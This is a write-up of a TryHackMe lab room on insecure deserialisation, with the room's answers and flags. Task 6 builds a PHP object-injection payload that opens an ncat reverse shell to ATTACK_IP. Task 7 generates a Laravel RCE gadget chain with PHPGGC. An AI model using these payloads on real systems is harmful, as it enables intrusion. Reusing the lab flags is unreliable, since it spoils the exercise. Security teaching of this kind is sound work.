---
layout: post
title: "Insecure Deserialisation"
date: 2025-05-08
tags: ["tryhackme"]
categories: [tryhackme]
hubs: "TryHackMe/Web Application Pentesting/Advanced Server-Side Attacks"
identifier: "20250508T000000"
source_id: "3fec7bcb-8f13-4618-92b9-5b7dde5ec0dc"
source_urls: "(https://tryhackme.com/room/insecuredeserialisation)"
source_path: "Web Application Pentesting/Advanced Server-Side Attacks/20250508T000000--insecure-deserialisation__tryhackme.md"
---


# Insecure Deserialisation

## Task 1 | Introduction

Start MachineUser-supplied input has consistently been a catalyst for vulnerabilities, posing persistent threats across numerous platforms and applications. Exploiting user input, from SQL injection to cross-site scripting, is a well-known challenge in securing web applications. Another less understood but equally dangerous vulnerability associated with user input is **insecure deserialisation** .

Insecure deserialisation exploits occur when an application trusts serialised data enough to use it without validating its authenticity. This trust can lead to disastrous outcomes as attackers manipulate serialised objects to achieve remote code execution, escalate privileges, or launch denial-of-service attacks. This type of vulnerability is prevalent in applications that serialise and deserialise complex data structures across various programming environments, such as Java, .NET, and PHP, which often use serialisation for remote procedure calls, session management, and more.

Learning Objectives

 Throughout this room, you will gain a comprehensive understanding of the following key concepts:
- How the serialisation and deserialisation process works
- Potential risks to web applications
- Exploitation techniques
- Mitigation measures

 Learning Prerequisites

 An understanding of the following topics is recommended before starting the room:

- [How Websites Work](https://tryhackme.com/room/howwebsiteswork)
- [Protocols and Servers](https://tryhackme.com/room/protocolsandservers)
- [OWASP Top 10](https://tryhackme.com/room/owasptop10)

 Connecting to the Machine

You can start the virtual machine by clicking the `Start Machine` button attached in this task. We use a vulnerable application later in the room to practically perform the exercise and become familiar with various attack vectors. Please wait 1-2 minutes after the system boots completely to let the auto scripts run successfully.

Let's begin!

### **Answer the questions below**

**Question:** I am ready to start the room.

*Answer:* 

     No answer needed

---

## Task 2 | Some Important Concepts

Before discussing insecure deserialisation in detail, it's crucial to understand the basic concept through a simple example.

Serialisation

Think of serialisation, like packing your school bag in the morning. You have books, notebooks, a lunchbox, and a water bottle, which you need to organise into your bag. Serialisation is just like taking different pieces of information (like notes) and putting them together to make them easy to store or send to a friend. ![Image 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/25179cc30d19a77dc77167e9d5ad7cd9.png)

In programming, serialisation is the process of transforming an object's state into a human-readable or binary format (or a mix of both) that can be stored or transmitted and reconstructed as and when required. This capability is essential in applications where data must be transferred between different parts of a system or across a network, such as in web-based applications. In PHP, this process is performed using the `serialize()` function.

**Example**

 

  
```
<?php
$noteArray = array("title" => "My THM Note", "content" => "Welcome to THM!");
$serialisedNote = serialize($noteArray);  // Converting the note into a storable format
file_put_contents('note.txt', $serialisedNote);  // Saving the serialised note to a file
?>
```

  The following output shows the serialised string in the `note.txt` file, which includes details of the note's structure and content. It’s stored in a way that can be easily saved or transmitted.

**Serialised Note** : `a:2:{s:5:"title";s:12:"My THM Note";s:7:"content";s:12:"Welcome to THM!";}`

Deserialisation

Imagine you arrive at school and need everything you packed this morning. Deserialisation is like unpacking your school bag when you get to class; you take out each item so you can use it throughout the day. As you unpack your bag to get your books and lunch, deserialisation takes the packed-up data and turns it back into something you can use. Deserialisation is the process of converting the formatted data back into an object. It's crucial for retrieving data from files, databases, or across networks, restoring it to its original state for usage in applications.

![Image 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9a199439b155641fc89ddfd09376ca62.png)

Following our previous example, here's how you might deserialise the note data in PHP:

  
```
<?php
$serialisedNote = file_get_contents('note.txt');  // Reading the serialised note from the file
$noteArray = unserialize($serialisedNote);  // Converting the serialised string back into a PHP array
echo "Title: " . $noteArray['title'] . "<br>";
echo "Content: " . $noteArray['content'];
?>
```

  This code reads the serialised note from a file and converts it back into an array, effectively reconstructing the original note. Discussing serialisation also necessitates a conversation about security. Like you wouldn’t want someone tampering with your school bag, insecure deserialisation can lead to significant security vulnerabilities in software applications. Attackers might alter serialised objects to execute unauthorised actions or steal data.

Specific Incidents Involving Serialisation Vulnerabilities

Let's discuss specific incidents where serialisation vulnerabilities played a critical role in cyber security breaches or attacks, highlighting the importance of secure serialisation practices. These examples illustrate how attackers exploit serialisation flaws to achieve remote code execution, data leakage, and more.

**Log4j Vulnerability CVE-2021-44228**

- **Incident** : The [Log4j vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), or Log4Shell, is a critical security flaw found in the Apache Log4j 2 library, a widely used logging library in Java applications. The vulnerability allows remote attackers to execute arbitrary code on affected systems by exploiting the library's insecure deserialisation functionality. If you want to learn more about this vulnerability, check out the [Solar, exploiting log4j](https://tryhackme.com/r/room/solar) room.
- **Impact:**  The vulnerability facilitated remote code execution, enabling attackers to execute arbitrary commands on affected systems. This allowed attackers to compromise critical infrastructure, leading to unauthorised access to sensitive data, service disruptions, and potential supply chain attacks.

 **WebLogic Server Remote Code Execution CVE-2015-4852**

- **Incident** : This vulnerability was related to how the [Oracle WebLogic Server](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html) deserialised data was sent to the T3 protocol. Attackers could send maliciously crafted objects to the server, which, when deserialised, led to remote code execution.
- **Impact** : This vulnerability was widely exploited to gain unauthorised access to systems, deploy ransomware, or steal data. It affected all versions of the WebLogic Server that had not disabled the vulnerable service or patched the issue.

**Jenkins Java Deserialisation CVE-2016-0792**

- **Incident** : [Jenkins](https://www.tenable.com/plugins/nessus/89034), a popular automation server used in software development, experienced a critical vulnerability involving Java deserialisation. Attackers could send crafted serialisation payloads to the Jenkins CLI, which, when deserialised, could allow arbitrary code execution.
- **Impact** : This allowed attackers to execute shell commands, potentially taking over the Jenkins server, which often has broad access to a software development environment, including source code, build systems, and potentially deployment environments.

### **Answer the questions below**

**Question:** What is the function used in PHP for serialisation?

*Answer:* 

     serialize()

**Question:** What is the base score for the vulnerability CVE-2015-4852?

*Answer:* 

     7.5

**Question:** Does serialisation allow only saving to a byte stream file? (yea/nay)

*Answer:* 

     nay

---

## Task 3 | Serialisation Formats

While different programming languages may use varying keywords and functions for serialisation, the underlying principle remains

![Image 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6eb6b58db4657f681b84ae0def396be4.png)

 consistent. As we know, serialisation is the process of converting an object's state into a format that can be easily stored or transmitted and then reconstructed later. Whether Java, Python, .NET, or PHP, each language implements serialisation to accommodate specific features or security measures inherent to its environment.

Unlike other common vulnerabilities that exploit the immediate processing of user inputs, insecure deserialisation problems involve a deeper interaction with the application’s core logic, often manipulating the fundamental behaviour of its components.

Now, let's explore how serialisation is explicitly handled in different languages, exploring its functionality, syntax, and unique features.

PHP Serialisation

In PHP, serialisation is accomplished using the `serialize()` function. This function converts a PHP object or array into a byte stream representing the object's data and structure. The resulting byte stream can include various data types, such as strings, arrays, and objects, making it unique. To illustrate this, let's consider a notes application where users can save and retrieve their notes. We'll create a PHP class called **Notes**  to represent each note and handle serialisation and deserialisation.

  
```
class Notes {
    public $Notescontent;

    public function __construct($content) {
        $this->Notescontent = $content;
    }
}
```

  

 In our Notes application, when a user saves a note, we serialise the Notes class object using PHP's `serialize()` function. This converts the object into a string representation that can be stored in a file or database. Let's take a look at the following code snippet that serialises the Notes class object:

  
```
$note = new Notes("Welcome to THM");
$serialized_note = serialize($note);
```

 

 Visit the link `http://MACHINE_IP/phptest/` and enter any string to serialise or deserialise. For example, if you enter the string **Welcome to THM** , it will generate the output `O:5:"Notes":1:{s:7:"content";s:14:"Welcome to THM";}` as shown below:

 ![Image 4](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d20f7d66a362af30e482a3b81561ed3.png)

 Let's decode the output:

- `O:5:"Notes":1:`: This part indicates that the serialised data represents an object of the class **Notes** , which has one property.
- `s:7:"content"`: This represents the property name "**content** " with a length of 7 characters. In serialised data, strings are represented with `s` followed by the length of the string and the string in double quotes. Integers are represented with `i` followed by the numeric value without quotes.
- `s:14:"Welcome to THM"`: This is the value of the **content** property, with a length of 14 characters.

 Magic Methods

PHP provides several [magic methods](https://www.php.net/manual/en/language.oop5.magic.php) that play crucial roles in the serialisation process. A few of the important methods are mentioned below:

![Image 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3eadbf114d33bd2c1feea8e41ff72d91.png)

- `__sleep()`: This method is called on an object before serialisation. It can clean up resources, such as database connections, and is expected to return an array of property names that should be serialised.
- `__wakeup()`: This method is invoked upon deserialisation. It can re-establish any connections that the object might need to operate correctly.
- `__serialize()`: As of PHP 7.4, this method enables you to customise the serialisation data by returning an array representing the object's serialised form.
- `__unserialize()`: This counterpart to `__serialize()` allows for customising the restoration of an object from its serialised data.

Python

Python uses a module called **Pickle**  to serialise and deserialise objects. This module converts a Python object into a byte stream (and vice versa), enabling it to be saved to a file or transmitted over a network. Pickling is a powerful tool for Python developers because it handles almost all types of Python objects without needing any manual handling of the object's state. We will follow the same notes application in Python as in PHP. Here is the code snippet from the `app.py` class:

  
```
import pickle
import base64

...
serialized_data = request.form['serialized_data']
notes_obj = pickle.loads(base64.b64decode(serialized_data))
message = "Notes successfully unpickled."
...

elif request.method == 'POST':
    if 'pickle' in request.form:
        content = request.form['note_content']
        notes_obj.add_note(content)
        pickled_content = pickle.dumps(notes_obj)
        serialized_data = base64.b64encode(pickled_content).decode('utf-8')
        binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
        message = "Notes pickled successfully."
```

 **Pickling Process**

 

- **Creating a Notes class** : This class manages a list of notes. It provides methods to add a note and retrieve all notes, making it easy to manage the application's state.
- **Serialisation (Pickling)** : When a user submits a note, the Notes class instance (including all notes) is serialised using `pickle.dumps()`. This function transforms the Python object into a binary format that Python can later turn back into an object.

 

 **Displaying the Serialised Data (Base64 Encoding)**

- **Why use base64** : Serialised data is binary and not safe for display in all environments. Binary data can contain bytes that may

![Image 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/30c29d8133d4a8bcbd803c521b9e32be.png)

 interfere with communication protocols (like HTTP). Base64 is an encoding scheme that converts binary data into plain text. It uses only readable characters, making it safe for transmission over channels that do not support binary data.
- **Encoding process** : After serialising the `Notes` object, the binary data is encoded into a base64 string using `base64.b64encode()`. This string is safe to display in the HTML and easily stored or transmitted.

**Deserialisation (Unpickling)**

- **Base64 decoding** : When unpickling, the base64 string is first decoded back into binary format using `base64.b64decode()`.
- **Unpickling** : The binary data is then passed to `pickle.loads()`, which reconstructs the original Python object from the binary stream.

Again, visit the link `http://MACHINE_IP:5000` and enter the string **Welcome to THM** :

![Image 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31e397f12ca8453606e381c3b19621a8.png)

- **Pickling** : When this string is pickled, it is converted into a binary format that is not human-readable. This binary format contains information about the data type, the data itself, and other necessary metadata to reconstruct the object.
- **Base64 encoding** : The binary form of the pickled data is then encoded into a Base64 string, which might look something like `gASVIQAAAAAAAACMBFdlbGNvbWXCoGFkZYFdcQAu`.

In exploring serialisation formats, we've discussed how this critical functionality is implemented in PHP and Python. PHP utilises the `serialize()` and `unserialize()` functions to manage the conversion of objects and other data types into a storable format that can be easily reconstructed. Similarly, Python employs the `Pickle`**** module to serialise objects into a byte stream and deserialise them back to their original state.

Beyond these two languages, serialisation is a common feature across various programming environments, each with unique implementations and libraries. In Java, object serialisation is facilitated through the `Serializable` interface, allowing objects to be converted into byte streams and vice versa, which is essential for network communication and data persistence. For .NET, serialisation has evolved significantly over the years. Initially, `BinaryFormatter` was commonly used for binary serialisation; however, its use is now discouraged due to security concerns. Modern .NET applications typically use `System.Text.Json` for JSON serialisation, or **System.Xml.Serialization**  for XML tasks, reflecting a shift towards safer, more standardised data interchange formats. Ruby offers simplicity with its `Marshal` module, which is renowned for serialising and deserialising objects, and for more human-readable formats, it often utilises YAML. Each language’s approach to serialisation reflects its usage contexts and security considerations, highlighting the importance of understanding and properly implementing serialisation to ensure the integrity and security of data across web applications.

### **Answer the questions below**

**Question:** What is the base64 encoded output after pickling the string You got it in Python? Utilise the notes app found at http://MACHINE_IP:5000.

*Answer:* 

     gASVNQAAAAAAAACMCF9fbWFpbl9flIwFTm90ZXOUk5QpgZR9lIwFbm90ZXOUXZSMCllvdSBnb3QgaXSUYXNiLg==

**Question:** What is the output after serialising the string You got it in PHP?

*Answer:* 

     O:5:"Notes":1:{s:7:"content";s:10:"You got it";}

**Question:** What is the renowned binary serialisation module used in Ruby?

*Answer:* 

     Marshal

---

## Task 4 | Identification

After a thorough understanding of serialisation across different programming languages, we will now transition into a critical aspect of cyber security, exploiting and mitigating vulnerabilities related to serialisation. Before discussing the specifics of exploitation techniques, it's crucial to understand how to identify these vulnerabilities in applications, whether you have access to the code (white-box testing) or not (black-box testing).

Access to the Source Code

![Image 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f7fc8a78e53eaa644b6c8a9fb6d4369c.png)

When access to the source code is available, identifying serialisation vulnerabilities can be more straightforward but requires a keen understanding of what to look for. For example, through code review, we can examine the source code for uses of serialisation functions such as `serialize()`, `unserialize()`, `pickle.loads(`), and others. We must pay special attention to any point where user-supplied input might be passed directly to these functions.

No Access to the Source Code

When auditing an application without access to its source code, the challenge lies in deducing how it processes data based solely on external observations and interactions. This is commonly referred to as **black-box testing** . Here, we focus on detecting patterns in server responses and cookies that might indicate the use of serialisation and potential vulnerabilities. As a pentester, appending a tilde `~` at the end of a PHP file name is a common technique attackers use to try to access backup or temporary files created by text editors or version control systems. When a file is edited or saved, some text editors or version control systems may make a backup copy of the original file with a tilde appended to the file name.

**Analysing Server Responses**

- **Error messages** : Certain error messages can indirectly indicate issues with serialisation. For instance, PHP might throw errors or warnings that contain phrases like `unserialize()` or **Object deserialisation error** , which are giveaways of underlying serialisation processes and potential points of vulnerability.
- **Inconsistencies in application behaviour** : Unexpected behaviour in response to manipulated input (e.g., modified cookies or POST data) can suggest issues with how data is deserialised and handled. Observing how the application handles altered serialised data can provide clues about potentially vulnerable code.

**Examining Cookies**

Cookies are often used to store serialised data in web applications. By examining the contents of cookies, one can usually infer:

- **Base64 encoded values in cookies (PHP and .NET)** : If cookies contain data that looks base64 encoded, decoding it might reveal serialised objects or data structures. PHP often uses serialisation for session management and storing session variables in serialised format.
- **ASP.NET view state** : .NET applications might use serialisation in the view state sent to the client's browser. A field named `__VIEWSTATE`, which is base64 encoded, can sometimes be seen. Decoding and examining it can reveal whether it contains serialised data that could be exploited.

In this task, we learned how to identify vulnerabilities. In the upcoming tasks, we will examine various techniques for exploiting the vulnerability.

### **Answer the questions below**

**Question:** Visit the URL http://MACHINE_IP/who/index.php and identify what is the user-defined function used for serialisation?

*Answer:* 

     HelloTHMSerialization

---

## Task 5 | Exploitation - Update Properties

Updating Properties of an Object

In this task, we'll explore a practical example in PHP, using a simple note-sharing application as our case study. Our note-sharing application allows users to create, save, and share notes easily. Users can input their notes into the application, which are then saved for future reference. Additionally, users can share their notes with others, facilitating collaboration and information exchange. The application also includes subscription-based features, ensuring only subscribed users can access certain functionalities such as note sharing. You can access the website by visiting the link `http://MACHINE_IP/case1`.

![Image 9](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d3b4a29dd4ca6d3357f3b5372e368468.png)

Let's go through how the application has been built.

 **Defining the Notes Class**

The application has a `Notes` class, representing a note in our application. This class has three private properties: `user`, `role`, and `isSubscribed`. We also have setter and getter methods to manipulate the `isSubscribed` property.

  
```
class Notes {

    private $user;
    private $role;
    private $isSubscribed;

    public function __construct($user, $role, $isSubscribed) {
        $this->user = $user;
        $this->role = $role;
        $this->isSubscribed = $isSubscribed;
    }

    public function setIsSubscribed($isSubscribed) {
        $this->isSubscribed = $isSubscribed;
    }

    public function getIsSubscribed() {
        return $this->isSubscribed;
 }
}
```

 

 **Storing User Data in Cookies**

When a user visits our application for the first time, it sets a serialised cookie containing their user data. This includes their user name, role, and subscription status (`isSubscribed`). If the user is a paid member (**isSubscribed = true** ), they are allowed to share notes.

 ![Image 10](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e5ce341b090b04e5749ad1834199bba2.png)

 **Exploiting the Vulnerability******

In this step, we'll illustrate how an attacker can exploit the vulnerability by modifying the serialised cookie value to gain unauthorised access to share notes.

 
- **Serialised cookie** : After decoding the base64-encoded cookie value, we obtain the following serialised representation of the Notes object:

  
```
O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}
```

 

 As we already know, in PHP serialisation, the class name is prefixed to the property names in case it is not public to ensure uniqueness and help with deserialisation. This is a part of how PHP handles object serialisation and deserialisation internally. When an object is serialised, PHP stores the object's properties and class name. This ensures that when the object is later deserialised, PHP knows which class to instantiate and how to assign the serialised data to the object's properties correctly. Let's break down the serialised note into its components:

- **O:5:"Notes":3** : This represents an object (O) with the class name Notes, which has three properties.
- **s:4:"user";s:5:"guest"** : This indicates a string (s) with a length of 4 characters, representing the property `user` with the value "**guest** ".
- **s:4:"role";s:5:"guest"** : Similar to the previous one, it represents the property `role` with the value "**guest** ".
- **s:12:"isSubscribed";b:0** : This represents a boolean (b) property named `isSubscribed` with the value of false (0).

Exploiting the Vulnerability

In the current scenario, when the user would like to try to share the note, they get the following pop-up:

 ![Image 11](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9bfc64dfa33447bc22bb8adb2b37ca9c.png)

 

Now, what is happening on the backend? The backend PHP code validates the incoming cookie, deserialises it, and then validates whether the user is subscribed. Our main task is to bypass that.

Suppose an attacker intercepts this serialised cookie value and modifies the `isSubscribed` property from false (0) to true (1). The attacker can manipulate the subscription status without legitimate authorisation by changing the boolean value in the serialised data.

 ![Image 12](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3bc45283cd430f96411a2b62afa41cf6.png)

 

 After modifying, the attacker would base64 encode the serialised data again and replace the original cookie value with the modified one. This would grant them unauthorised access to share notes on other platforms, bypassing the intended subscription restrictions.

### **Answer the questions below**

**Question:** What is the flag value after sharing a note with a valid subscription?

*Answer:* 

     THM{10101}

**Question:** What is the default role value once the user loads the notes application?

*Answer:* 

     guest

---

## Task 6 | Exploitation - Object Injection

Object injection is a vulnerability that arises from insecure data deserialisation in web applications. It occurs when untrusted data is deserialised into an object, allowing attackers to manipulate the serialised data to execute arbitrary code, leading to serious security risks. In this task, we'll explore how object injection works and demonstrate its impact through a simple PHP code snippet.

As we know, the vulnerability arises from the process of serialisation and deserialisation, which allows PHP objects to be converted into a storable format (serialisation) and reconstructed back into objects (deserialisation). While serialisation and deserialisation are useful for data storage and transmission, they can also introduce security risks if not properly implemented.

To exploit a PHP Object Injection vulnerability, the application should include a class featuring a PHP magic method (like `__wakeup` or `__sleep`) that can be exploited for malicious purposes. All classes involved in the attack should be declared before calling the `unserialize()` method (unless object autoloading is supported).

**Example******

Let's consider an `index.php` code snippet that shows the serialisation and deserialisation using the `serialize()` and `unserialize()` functions. The code accepts **GET**  parameter **decode**  or **encode** and converts the user-provided value accordingly.

  
```
<?php
class UserData {
    private $data;
    public function __construct($data) {
        $this->data = $data;
    }
..
require 'test.php';
if(isset($_GET['encode'])) {
    $userData = new UserData($_GET['encode']);
    $serializedData = serialize($userData);
    $base64EncodedData = base64_encode($serializedData);
    echo "Normal Data: " . $_GET['encode'] . "<br>";
    echo "Serialized Data: " . $serializedData . "<br>";
    echo "Base64 Encoded Data: " . $base64EncodedData;

} elseif(isset($_GET['decode'])) {
    $base64EncodedData = $_GET['decode'];
    $serializedData = base64_decode($base64EncodedData);
    $test = unserialize($serializedData);
    echo "Base64 Encoded Serialized Data: " . $base64EncodedData . "<br>";
    echo "Serialized Data: " . $serializedData;

...
```

 

For example, if we send the input **hellothm**  via the URL [http://MACHINE_IP/case2/?encode=hellothm](http://machine_ip/case2/?encode=hellothm), we will get the following output:

 ![Image 13](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/711bd1f1f1922a3ae8dc0fe0e32fac81.png)

 

We see that the code includes a file called `test.php`. From a source code review or considering whether the framework is open source, the pentester knows that `test.php` contains a class called `MaliciousUserData` as shown below:

 
```
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server
    
    public function __wakeup() { 
    exec($this->command);
...

?>
```

  

In the above code, through insecure deserialisation, it's possible to manipulate the properties of an object, including altering the `command` property of the `MaliciousUserData` class in the above code. This can be achieved by crafting a specially crafted serialised string that contains the desired property values. For instance, if we want to modify the `command` property to execute a different command or connect to a different server, we can serialise an object with the desired property value and then inject it into the vulnerable `unserialize()` function. This way, upon deserialisation, the manipulated property value will be loaded into the object.

It is important to understand that during insecure deserialisation, you can't directly update the definition of the `__wakeup` method itself. The `__wakeup` method is a part of the class definition and remains static during the deserialisation process. However, what you can do is modify the behavior or properties of the object within the `__wakeup` method. This means that while the method's definition remains constant, its actions upon deserialisation can be manipulated to achieve different outcomes.

Now that we understand the basics, it's time to prepare a payload.

 Preparing the Payload

 As discussed earlier, calling another class is a normal feature in PHP, and you can view the code of that file if the target website is using open-source code. The code in `index.php` blindly unserialises the input without performing any sanitisation. What is the option here? What if we modify the class `MaliciousUserData` and modify its `command` attribute such that when the `__wakeup` function is called, it will be called with the attacker-provided value?

Let's create some PHP code on our AttackBox that generates malicious serialised user data.

  
```
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
}

$maliciousUserData = new MaliciousUserData();
$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);
echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
?>
```

  

 

- In the above code, the `_wakeup()` function of `MaliciousUserData` class (`test.php`) will execute a reverse shell command using Ncat to connect to the specified IP address (`ATTACK_IP`) and port (`4444`) with the -e flag to execute `/bin/sh` as a shell
- Once you create the file, execute it through `php index.php` through the terminal. This will return a base64-encoded serialised object of the `MaliciousUserData` class.
- The generated base64 encoded string would look like this: `TzoxNzoiTWFsaWNp[Redacted]`.
- Start the Netcat listener on port 4444 using the command `nc -nvlp 4444` on the AttackBox.
- Now, it's time to exploit the insecure deserialisation by decoding the shellcode by visiting the URL `http://MACHINE_IP/case2/?decode=[SHELLCODE]` without generating the shellcode.
- Once you visit the URL, the index.php file's deserialise function will deserialise the string and execute the `__wakeup()` function, leading to a remote shell.

 

    Terminal  
```Terminal 
thm@ubuntu$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from ATTACK_IP 35838 received!
```

  

 In the upcoming tasks, we will understand the issues that allowed the attacker to exploit the vulnerability and how we can secure it from a secure coder perspective.

### **Answer the questions below**

**Question:** What is the flag value after getting the reverse shell?

*Answer:* 

     THM{GOT_THE_SH#LL}

**Question:** What is the output of the whoami command after getting the shell?

*Answer:* 

     www-data

---

## Task 7 | Automation Scripts

Automating scripts during pen-testing is essential for efficiently identifying and exploiting vulnerabilities in web applications. In this task, we will explore one such tool called **PHP Gadge Chain (PHPGGC)**  that plays a crucial role in this process, automating the discovery of insecure deserialisation vulnerabilities. PHPGGC, akin to Ysoserial in the Java ecosystem, helps security professionals assess the security posture of PHP applications and mitigate potential risks.

PHP Gadget Chain (PHPGGC)

PHPGGC is primarily a tool for generating gadget chains used in PHP object injection attacks, specifically tailored for exploiting vulnerabilities related to PHP object serialisation and deserialisation.

**Functionality**

- **Gadget Chains** : PHPGGC provides a library of gadget chains for various PHP frameworks and libraries. These gadget chains are sequences of objects and methods designed to exploit specific vulnerabilities when a PHP application unsafely unserialises user-provided data.
- **Payload Generation** : The main purpose of PHPGGC is to facilitate the generation of serialised payloads that can trigger these vulnerabilities. It helps security researchers and penetration testers create payloads that demonstrate the impact of insecure deserialisation flaws.
- **Payload Customisation** : Users can customise payloads by specifying arguments for the functions or methods involved in the gadget chain, thereby tailoring the attack to achieve specific outcomes, such as encoding.

You can download PHPGGC from its [GitHub repository](https://github.com/ambionics/phpggc) or use the version already available on the AttackBox via the `/opt/phpggc` directory. The installed version already contains a few gadget chains, sequences of PHP objects, and method calls designed to exploit deserialisation vulnerabilities. These gadget chains leverage PHP's magic methods to achieve various attack objectives, such as remote code execution. 
To list all available gadget chains, you can use the `-l` option with PHPGGC, which will show the Name, Version, Type and Vector for launching a specific attack. Additionally, you can filter gadget chains based on their capabilities, such as those targeting particular PHP frameworks or achieving specific exploit techniques, using the `-l` option followed by a filter keyword (Drupal, Laravel, etc.). This allows you to select the appropriate gadget chain for your exploitation scenario, as shown below:

    Terminal  
```Terminal 
thm@machine$ php phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                                 TYPE                      VECTOR          I    
Bitrix/RCE1                               17.x.x <= 22.0.300                                      RCE: Command              __destruct           
CakePHP/RCE1                              ? <= 3.9.6                                              RCE: Command              __destruct           
CakePHP/RCE2                              ? <= 4.2.3                                              RCE: Command              __destruct           
CodeIgniter4/FD1                          <= 4.3.6                                                File delete               __destruct           
CodeIgniter4/FD2                          <= 4.3.7                                                File delete               __destruct           
CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                          File read                 __toString      *    
CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                     RCE: Command              __destruct           
CodeIgniter4/RCE3                         4.0.4 <= 4.4.3                                          RCE: Command              __destruct           
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE: Command              __destruct
```

 For example, the output for `CakePHP/RCE1` means that the gadget chain named `CakePHP/RCE1` exploits an RCE vulnerability in CakePHP versions of up to `3.9.6`. This vulnerability allows attackers to execute arbitrary commands on the server by leveraging the `__destruct` magic method.

Exploiting a Web Application

As a pentester, we are focusing on a Laravel website to exploit a known vulnerability identified under [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133). The vulnerability is triggered when Laravel deserialises (unpacks) the untrusted data from the `X-XSRF-TOKEN`. This deserialisation process can lead to executing arbitrary code on the server if not handled securely. The details regarding the vulnerability can be read from the [Laravel security release](https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30), but our main focus will be how we can utilise PHP gadget chains during exploitation. The vulnerability mentioned above can be exploited using three main factors:

- **Step 1** : Requires `APP_KEY` from Laravel, which the framework uses to encrypt the XSRF token.
- **Step 2** : Use PHPGGC to generate an unserialised payload executing a command. This is considered a complex task, and the tool comes to the rescue.
- **Step 3** : Finally, we must encrypt the payload using the APP_KEY and send the POST request. This usually varies from framework to framework.

 In this task, our focus will primarily be on Step 2 and understanding how PHPGGC will assist us as a pentester. Visit the vulnerable Laravel application at [http://MACHINE_IP:8089](http://machine_ip:8089/). As a pentester, we can identify web application versions through multiple techniques. You can visit the [Information Gathering and Vulnerability Scanning](https://tryhackme.com/module/information-gathering-and-vulnerability-scanning) module to learn this in detail. The Laravel application version is 5.6.29.

![Image 14](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/821938ace57fe41fea2c7476da9e3e4e.png)

Now we will go into detailed step-by-step exploitation:

- For the first step, we will acquire the APP_KEY through any attack vector, such as social engineering. You can get the `APP_KEY` by visiting [http://MACHINE_IP:8089/get-key](http://machine_ip:8089/get-key). For your convenience, this page will also provide you with the first payload that has the **whoami**  command.
- For the second step, we need to identify the payload we can use.

    Terminal  
```Terminal 
thm@machine$ php phpggc -l Laravel

Gadget Chains
-------------

NAME                  VERSION           TYPE             VECTOR    
Laravel/RCE1          5.4.27            rce              __destruct
Laravel/RCE2          5.5.39            rce              __destruct
Laravel/RCE3          5.5.39            rce              __destruct
Laravel/RCE4          5.5.39            rce              __destruct
```

 Moving forward, we can generate the payload using various gadgets. Each gadget has its relevancy and utilises different classes during the deserialisation process. We will use RCE3 in this example and can generate the payload by typing the command `php phpggc -b Laravel/RCE3 system whoami` for a base-64 encoded payload. A non-encoded payload is shown below:

    Terminal  
```Terminal 
thm@machine$ php phpggc Laravel/RCE3 system whoami O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}
```

 

 Breakdown of the Payload

- `Illuminate\Broadcasting\PendingBroadcast`: This class handles event broadcasts in Laravel. Here, it's primarily a vehicle for carrying the nested malicious object.
- `Illuminate\Notifications\ChannelManager`: This object manages notification channels. We manipulate it to inject arbitrary code execution through its properties, `*app`, which typically would reference the application service container. We misuse it to hold our command `whoami`. We also manipulated the `*defaultChannel` and `*customCreators` properties that are twisted to create a scenario where the PHP `assert` function is called, executing any code passed to it.

As we already know, Laravel initially employed **encrypted** and **serialised** cookies to securely store session and CSRF token data, using the same methodology for both. If you visit the vulnerable app, you can see the encrypted and serialised cookies, as shown below:

![Image 15](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9dfa21a7a10296faecf94afd2404bf5a.png)

The basic idea was to avoid tampering with data from bad actors, but nevertheless, they did not realise that even such a strong security mechanism could be breached through insecure serialisation.

